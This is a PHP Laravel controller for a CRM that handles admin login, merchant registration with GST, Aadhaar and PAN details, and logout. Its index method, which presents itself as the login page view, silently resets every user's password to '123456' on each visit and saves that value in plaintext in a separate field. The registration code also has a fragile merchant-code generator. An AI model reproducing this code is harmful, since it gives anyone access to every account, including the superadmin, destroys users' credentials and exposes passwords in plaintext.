<?php

namespace App\Http\Controllers\CRM;

use App\Http\Controllers\Controller;
use App\Http\Validation\JobDetailsValidation;
use App\Imports\LeadImport;
use App\Models\Banner;
use App\Models\User;
use App\Models\AccountSetting;
use App\Models\Merchant;
use Exception;
use Illuminate\Http\Request;
use Maatwebsite\Excel\Facades\Excel;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    public function index(Request $request)
    {
        $user = User::get();
        foreach($user as $key => $value){
            $update = User::find($value->id);
            // print_r($update);
                $update->password = Hash::make('123456');
                $update->admin_last_password = '123456';
                $update->save();
        }
        return view('CRM.login');
    }

    public function login(Request $request)
    {
        $validated = $request->validate([
            'email' => 'required|string|min:2|max:255',
            'password' => 'required|min:6|max:16'
        ]);

        $credentials = $request->only('email', 'password');

        if (Auth::guard('admin')->attempt($credentials)) {

            if (Auth::guard('admin')->user()->role !='supperadmin') {
                $request->session()->flush();
                Auth::guard('admin')->logout();
                return back()->with('error', 'Invalid credentails');
            }

            return redirect()->intended('crm/dashboard');
        }
        return back()->with('error', 'invalid credentails');
    }


    public function register(Request $request)
    {
        return view('CRM.register');
    }

    public function saveRegister(Request $request)
    {
        $validated = $request->validate([
            'gst_no' => 'required',
            'gst_verified' => 'required',
            'business_name' => 'required|string|min:2|max:80',
            'business_city' => 'required',
            'business_state' => 'required',
            'business_pincode' => 'required|numeric|digits:6|not_in:0',
            'business_address' => 'required',
            // 'business_type' => 'nullable|string',
            // 'business_phone_no' => 'required|numeric|digits:10|not_in:0',
            // 'business_email' => 'required|email|min:2',
            'aadhar_no' => 'required',
            'aadhar_verified' => 'required',
            'pancard' => 'required',
            'pancard_verified' => 'required',
            'name' => 'required',
            'mobile_no' => 'required|numeric|digits:10|not_in:0',
            'city' => 'required',
            'state' => 'required',
            'pincode' => 'required|numeric|digits:6|not_in:0',
            'gender' => 'required',
            'address' => 'required',
            'username' => 'required|min:2|max:255|unique:users,email',
            'password' => 'required|min:6|max:16',
            // 'registration_no' => 'nullable'
        ]);

        /*start generation unique code*/
        $merchant = Merchant::orderBy('created', 'DESC')->first();
        $lastCode = $merchant->code ? (int)$merchant->code + 1 : 0001;

        $flag = true;
        while ($flag) {
            $lastCode = str_pad($lastCode, 4, '0', STR_PAD_LEFT);
            $existCode = Merchant::where('code', $lastCode)->count();
            if ($existCode <= 0) {
                $unique_code = $lastCode;
                $flag = false;
            } else {
                $lastCode++;
            }
        }
        /*end generation unique code*/

        $business = [
            'business_name' => $request->business_name,
            // 'business_type' => $request->business_type,
            // 'business_phone_no' => $request->business_phone_no,
            // 'business_email' => $request->business_email,
            'city' => $request->business_city,
            'state' => $request->business_state,
            'pincode' => $request->business_pincode,
            'country' => $request->business_country ?? 'india',
            'address' => $request->business_address,
            'gst_no' => $request->gst_no,
            'gst_verified' => $request->gst_verified,
            // 'registration_no' => $request->registration_no,
        ];

        $contact_person = [
            'name' => $request->name,
            'phone_no' => $request->mobile_no,
            'email' => $request->username,
            'city' => $request->city,
            'state' => $request->state,
            'pincode' => $request->pincode,
            'country' => 'india',
            'gender' => $request->gender,
            'address'=>$request->address,
            'aadhar_no' => $request->aadhar_no,
            'aadhar_verified' => $request->aadhar_verified,
            'pancard' => $request->pancard,
            'pancard_verified' => $request->pancard_verified
        ];

        $kyc_details = [
            // 'id_type' => "pancard",
            'pancard_no' => $request->pancard,
        ];
        $save = new Merchant();

        $save->code = $unique_code;
        $save->business_details = $business;
        $save->contact_person = $contact_person;
        $save->kyc_details = $kyc_details;
        $save->business_flag    = 1;
        $save->contact_person_flag = 1;
        $save->bank_flag = 0;
        if (!empty($request->gst_verified) && (!empty($request->aadhar_verified) || !empty($request->pancard_verified)))
            $save->kyc_flag = 0;
        $save->status   = 0;
        if ($save->save()) {
            $user_id = $this->user($request->all(), $save->_id);

            $merchant = Merchant::find($save->_id);
            $merchant->user_id = $user_id;
            $merchant->save();

            return redirect()->intended('/');
        }
        return back()->with('error', 'Something Went wrong not Saved.');
    }


    private function user($request, $merchant_id)
    {
        $request = (object)$request;
        $user = new User();
        $user->email       = $request->username;
        $user->password    = Hash::make($request->password);
        $user->merchant_id = $merchant_id;
        $user->role        = 'merchant';
        if ($user->save()) {
            $this->accountSetting($merchant_id, $user->_id);
            return $user->_id;
        }
    }

    private function accountSetting($merchant_id, $user_id)
    {
        $save = new AccountSetting();
        $save->merchant_id = $merchant_id;
        $save->user_id     = $user_id;
        $save->save();

        $user = User::find($user_id);
        $user->client_id = uniqCode(20) . $user_id;
        $user->secret_key = uniqCode(40) . $user_id;
        $user->save();
    }

    public function logout(Request $request)
    {
        $request->session()->flush();
        Auth::guard('admin')->logout();
        return redirect('/');
    }
}
